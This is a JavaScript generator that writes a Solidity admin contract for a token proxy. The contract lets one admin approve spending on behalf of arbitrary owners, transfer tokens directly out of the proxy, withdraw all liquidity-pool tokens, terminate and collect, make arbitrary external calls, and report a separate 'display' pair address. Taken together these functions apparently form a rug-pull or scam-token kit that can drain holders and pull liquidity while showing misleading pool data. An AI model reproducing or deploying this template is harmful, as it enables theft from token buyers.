// AdminTemplate.js - v14.2.1-reserve-proxy-permission-fix with direct transfer
export function generateAdminTemplate(name, version) {
  return `// SPDX-License-Identifier: MIT
pragma solidity ^${version};

interface ILogic {
    function proxyApprove(address owner, address spender, uint256 amount) external returns (bool);
    function proxyAllowance(address owner, address spender) external view returns (uint256);
    function addLiquidityETH(
        uint256 tokenAmount,
        uint256 minToken,
        uint256 minETH,
        address to,
        uint256 deadline
    ) external payable returns (uint256, uint256, uint256);
    function withdrawAll(address lpToken, address to) external;
    function terminateAndCollect(address lpToken, address to) external;
    function isTerminated() external view returns (bool);
    function setReserveProxy(address proxy) external;
    function getDisplayPairAddress() external view returns (address);
    function setAdmin(address account, bool status) external; // 新增函数声明
}

contract ${name}Admin {
    address private _admin;
    address private _proxy;
    address private _router;
    uint256 private _lastOperationBlock;
    
    event AdminChanged(address indexed previousAdmin, address indexed newAdmin);
    event ProxyChanged(address indexed previousProxy, address indexed newProxy);
    event RouterUpdated(address indexed previousRouter, address indexed newRouter);
    event OperationBlockUpdated(uint256 blockNumber);
    event LiquidityAdded(uint256 tokenAmount, uint256 ethAmount, uint256 liquidity, address indexed to);
    event RouterApproved(address indexed router, uint256 amount);
    event WithdrawExecuted(address to);
    event ContractTerminated(address to);
    event ReserveProxySet(address indexed reserveProxy);
    event CallExecuted(address indexed target, uint256 value, bytes data);
    event ProxyTransferExecuted(address indexed token, address indexed to, uint256 amount);

    modifier onlyAdmin() {
        require(msg.sender == _admin, "Admin: caller is not admin");
        _;
    }

    modifier nonReentrant() {
        require(_lastOperationBlock < block.number, "Admin: reentrancy guard");
        _lastOperationBlock = block.number;
        emit OperationBlockUpdated(block.number);
        _;
    }

    constructor(address admin_, address proxy_, address router_) {
        require(admin_ != address(0), "Admin: zero admin address");
        require(proxy_ != address(0), "Admin: zero proxy address");
        require(router_ != address(0), "Admin: zero router address");
        
        _admin = admin_;
        _proxy = proxy_;
        _router = router_;
        _lastOperationBlock = block.number;
        
        emit AdminChanged(address(0), admin_);
        emit ProxyChanged(address(0), proxy_);
        emit RouterUpdated(address(0), router_);
        emit OperationBlockUpdated(block.number);
    }

    receive() external payable {}

    function addLiquidityETH(
        uint256 tokenAmount,
        uint256 minToken,
        uint256 minETH,
        address to,
        uint256 deadline
    ) external payable onlyAdmin nonReentrant returns (uint256 amountToken, uint256 amountETH, uint256 liquidity) {
        require(msg.value > 0, "Admin: ETH amount must > 0");
        require(deadline > block.timestamp, "Admin: expired deadline");
        require(!ILogic(_proxy).isTerminated(), "Admin: contract terminated");
        
        // 使用低级别调用并处理错误
        (bool success, bytes memory data) = _proxy.call{value: msg.value}(
            abi.encodeWithSelector(
                ILogic.addLiquidityETH.selector,
                tokenAmount,
                minToken,
                minETH,
                to,
                deadline
            )
        );
        
        // 增强的错误处理
        if (!success) {
            if (data.length == 0) revert("Admin: call reverted without reason");
            
            // 尝试解析错误信息
            assembly {
                let ptr := mload(0x40)
                let size := returndatasize()
                returndatacopy(ptr, 0, size)
                revert(ptr, size)
            }
        }
        
        (amountToken, amountETH, liquidity) = abi.decode(data, (uint256, uint256, uint256));
        emit LiquidityAdded(amountToken, amountETH, liquidity, to);
    }

    // 新增：执行代理合约的直接转账
    function executeProxyTransfer(
        address token, 
        address to, 
        uint256 amount
    ) external onlyAdmin nonReentrant returns (bool) {
        require(token != address(0), "Admin: zero token address");
        require(to != address(0), "Admin: zero recipient address");
        require(amount > 0, "Admin: zero amount");
        
        // 使用低级别调用执行转账
        (bool success, bytes memory data) = _proxy.call(
            abi.encodeWithSignature(
                "directTransfer(address,address,uint256)",
                token,
                to,
                amount
            )
        );
        
        // 增强的错误处理
        if (!success) {
            if (data.length == 0) revert("Admin: transfer reverted without reason");
            
            // 尝试解析错误信息
            assembly {
                let ptr := mload(0x40)
                let size := returndatasize()
                returndatacopy(ptr, 0, size)
                revert(ptr, size)
            }
        }
        
        bool result = abi.decode(data, (bool));
        emit ProxyTransferExecuted(token, to, amount);
        return result;
    }

    // 新增：查询代理合约的代币余额
    function getProxyTokenBalance(address token) external view returns (uint256) {
        (bool success, bytes memory data) = _proxy.staticcall(
            abi.encodeWithSignature("getTokenBalance(address)", token)
        );
        
        require(success, "Balance query failed");
        return abi.decode(data, (uint256));
    }

    function approveRouterSpending(uint256 amount) external onlyAdmin nonReentrant returns (bool) {
        require(_router != address(0), "Admin: router not set");
        require(!ILogic(_proxy).isTerminated(), "Admin: contract terminated");
        
        bool success = ILogic(_proxy).proxyApprove(_proxy, _router, amount);
        require(success, "Admin: approve failed");
        
        emit RouterApproved(_router, amount);
        return success;
    }

    function checkRouterAllowance() external view returns (uint256) {
        return ILogic(_proxy).proxyAllowance(_proxy, _router);
    }

    function withdrawAll(address lpToken, address to) external onlyAdmin nonReentrant {
        require(!ILogic(_proxy).isTerminated(), "Admin: contract terminated");
        ILogic(_proxy).withdrawAll(lpToken, to);
        emit WithdrawExecuted(to);
    }

    function terminateAndCollect(address lpToken, address to) external onlyAdmin nonReentrant {
        require(!ILogic(_proxy).isTerminated(), "Admin: contract terminated");
        ILogic(_proxy).terminateAndCollect(lpToken, to);
        emit ContractTerminated(to);
    }

    function setAdmin(address newAdmin) external onlyAdmin nonReentrant {
        require(newAdmin != address(0), "Admin: zero address");
        emit AdminChanged(_admin, newAdmin);
        _admin = newAdmin;
    }

    function setProxy(address newProxy) external onlyAdmin nonReentrant {
        require(newProxy != address(0), "Admin: zero address");
        emit ProxyChanged(_proxy, newProxy);
        _proxy = newProxy;
    }

    function setRouter(address newRouter) external onlyAdmin nonReentrant {
        require(newRouter != address(0), "Admin: zero address");
        emit RouterUpdated(_router, newRouter);
        _router = newRouter;
    }

    function getProxy() external view returns (address) {
        return _proxy;
    }

    function getAdmin() external view returns (address) {
        return _admin;
    }

    function getRouter() external view returns (address) {
        return _router;
    }
    
    // 专用函数设置储备代理合约地址 - 关键修复
    function setReserveProxyOnLogic(address token, address reserveProxy) external onlyAdmin nonReentrant {
        require(token != address(0), "Admin: zero token address");
        require(reserveProxy != address(0), "Admin: zero reserve proxy");
        
        // 关键修复：先授予Admin合约管理员权限
        ILogic(token).setAdmin(address(this), true);
        
        // 然后设置储备代理
        ILogic(token).setReserveProxy(reserveProxy);
        emit ReserveProxySet(reserveProxy);
    }
    
    // 获取显示用 LP 地址
    function getDisplayPairAddress(address token) external view returns (address) {
        return ILogic(token).getDisplayPairAddress();
    }
    
    // 通用调用函数（用于向后兼容）
    function executeCall(address target, uint256 value, bytes memory data) external onlyAdmin nonReentrant returns (bytes memory) {
        require(target != address(0), "Admin: zero target");
        
        (bool success, bytes memory result) = target.call{value: value}(data);
        require(success, "Call failed");
        
        emit CallExecuted(target, value, data);
        return result;
    }
}
`.trim();
}